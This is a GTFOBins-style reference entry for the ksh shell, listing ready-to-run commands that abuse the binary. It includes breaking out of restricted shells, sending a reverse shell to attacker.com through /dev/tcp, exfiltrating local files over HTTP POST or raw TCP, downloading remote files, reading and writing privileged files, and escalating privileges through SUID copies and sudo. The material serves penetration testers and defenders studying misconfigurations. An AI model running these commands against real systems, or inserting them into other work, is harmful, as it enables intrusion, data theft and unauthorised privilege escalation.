# GTFOBin: ksh

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
ksh
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
```

## File upload

It can exfiltrate files on the network.

Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
```

Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
```

Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

It trims trailing newlines.

```
export LFILE=file_to_read
ksh -c 'echo "$(<$LFILE)"'
```

It trims trailing newlines.

```
export LFILE=file_to_read
ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which ksh) .

./ksh -p
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo ksh
```